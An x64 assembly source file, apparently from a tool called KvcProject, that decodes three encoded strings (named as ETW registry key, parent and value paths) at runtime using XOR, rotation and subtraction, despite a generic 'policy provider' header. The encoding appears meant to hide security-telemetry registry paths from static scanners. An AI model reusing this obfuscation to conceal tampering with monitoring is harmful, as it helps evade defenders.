; ==============================================================================
; From KvcProject: System Configuration & Subsystem Policy Provider
; Dynamic reconstitution unit for environment authorization and policy schemas.
; Architecture: x64 | Zero-CRT | Atomic spin-locked decoding
; ==============================================================================

.data
ALIGN 8

_EtwRegKeyMask          dw 00A87h, 04A87h, 03A86h, 01A87h, 0CA87h, 06A86h, 07A87h, 02A86h
                        dw 09A87h, 0CA87h, 04A85h, 0CA85h, 03A99h, 01A99h, 00A99h, 07A99h
                        dw 0BA86h, 04A85h, 01A84h, 02A84h, 09A87h, 08A86h, 0CA99h, 05A98h
                        dw 00A86h, 04A85h, 0AA84h, 05A85h, 02A85h, 01A85h, 0EA84h, 0BA84h
                        dw 0CA84h, 09A87h, 08A86h, 0CA99h, 01A87h, 04A85h, 01A85h, 06A84h
                        dw 09A84h, 00A87h, 02A84h, 00A84h, 02A85h, 07A85h, 0EA84h, 01A85h
                        dw 0EA85h, 05A9Ah

_EtwRegParentMask       dw 00A87h, 04A87h, 03A86h, 01A87h, 0CA87h, 06A86h, 07A87h, 02A86h
                        dw 09A87h, 0CA87h, 04A85h, 0CA85h, 03A99h, 01A99h, 00A99h, 07A99h
                        dw 0BA86h, 04A85h, 01A84h, 02A84h, 09A87h, 08A86h, 0CA99h, 05A98h
                        dw 00A86h, 04A85h, 0AA84h, 05A85h, 02A85h, 01A85h, 0EA84h, 0BA84h
                        dw 0CA84h, 05A9Ah

_EtwRegValMask          dw 01A86h, 0EA84h, 07A85h, 05A87h, 07A85h, 04A85h, 01A84h, 02A85h
                        dw 00A84h, 01A85h, 07A86h, 06A84h, 00A85h, 02A84h, 05A9Ah

_EtwRegSessionSeed      dw 048D6h
_EtwRegQuantumDelta     dw 024C1h

_EtwStateRegKey         db 0
_EtwStateRegParent      db 0
_EtwStateRegVal         db 0

ALIGN 8
_EtwRegKeyBuffer        dw 50 dup(0)
ALIGN 8
_EtwRegParentBuffer     dw 34 dup(0)
ALIGN 8
_EtwRegValBuffer        dw 15 dup(0)

.code
ALIGN 16

_EtwRegDecodeBuffer PROC
    push rdi
    push rsi
    push rbx
    push r12
    mov rsi, rdx
    mov rdi, r8
    mov r12, rcx
    mov r9w, _EtwRegSessionSeed
reg_xor_loop:
    mov ax, [rsi]
    xor ax, r9w
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop reg_xor_loop

    mov rsi, r8
    mov rdi, r8
    mov rcx, r12
reg_rol_loop:
    mov ax, [rsi]
    rol ax, 4
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop reg_rol_loop

    mov rsi, r8
    mov rdi, r8
    mov rcx, r12
    mov r9w, _EtwRegQuantumDelta
reg_sub_loop:
    mov ax, [rsi]
    sub ax, r9w
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop reg_sub_loop

    pop r12
    pop rbx
    pop rsi
    pop rdi
    ret
_EtwRegDecodeBuffer ENDP

PUBLIC EtwGetRegistryPathString
EtwGetRegistryPathString PROC
    sub rsp, 28h
    cmp _EtwStateRegKey, 2
    je rk_return
    cmp _EtwStateRegKey, 1
    je rk_wait
    mov _EtwStateRegKey, 1
    mov rcx, 50
    lea rdx, _EtwRegKeyMask
    lea r8, _EtwRegKeyBuffer
    call _EtwRegDecodeBuffer
    mov _EtwStateRegKey, 2
    jmp rk_return
rk_wait:
    pause
    cmp _EtwStateRegKey, 2
    jne rk_wait
rk_return:
    lea rax, _EtwRegKeyBuffer
    add rsp, 28h
    ret
EtwGetRegistryPathString ENDP

PUBLIC EtwGetRegistryParentString
EtwGetRegistryParentString PROC
    sub rsp, 28h
    cmp _EtwStateRegParent, 2
    je rp_return
    cmp _EtwStateRegParent, 1
    je rp_wait
    mov _EtwStateRegParent, 1
    mov rcx, 34
    lea rdx, _EtwRegParentMask
    lea r8, _EtwRegParentBuffer
    call _EtwRegDecodeBuffer
    mov _EtwStateRegParent, 2
    jmp rp_return
rp_wait:
    pause
    cmp _EtwStateRegParent, 2
    jne rp_wait
rp_return:
    lea rax, _EtwRegParentBuffer
    add rsp, 28h
    ret
EtwGetRegistryParentString ENDP

PUBLIC EtwGetRegistryValueString
EtwGetRegistryValueString PROC
    sub rsp, 28h
    cmp _EtwStateRegVal, 2
    je rv_return
    cmp _EtwStateRegVal, 1
    je rv_wait
    mov _EtwStateRegVal, 1
    mov rcx, 15
    lea rdx, _EtwRegValMask
    lea r8, _EtwRegValBuffer
    call _EtwRegDecodeBuffer
    mov _EtwStateRegVal, 2
    jmp rv_return
rv_wait:
    pause
    cmp _EtwStateRegVal, 2
    jne rv_wait
rv_return:
    lea rax, _EtwRegValBuffer
    add rsp, 28h
    ret
EtwGetRegistryValueString ENDP

END
